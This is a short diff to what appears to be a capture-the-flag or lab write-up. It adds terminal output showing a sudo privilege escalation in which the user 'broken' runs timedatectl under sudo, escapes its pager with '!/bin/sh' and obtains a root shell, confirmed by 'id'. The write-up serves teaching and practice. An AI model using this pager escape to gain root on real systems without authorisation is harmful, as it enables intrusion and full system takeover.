@@ -137,10 +137,13 @@ User broken may run the following commands on ubuntu:
 we can use `timedatectl` to escalate our privileges :
 
 ```bash
-sudo /usr/bin/timedatectl list-timezones
+broken@ubuntu:~$ sudo /usr/bin/timedatectl list-timezones
 !/bin/sh
+# id
+uid=0(root) gid=0(root) groups=0(root)
 ```
 
+this is how you can get root on this machine :)
 
 
 
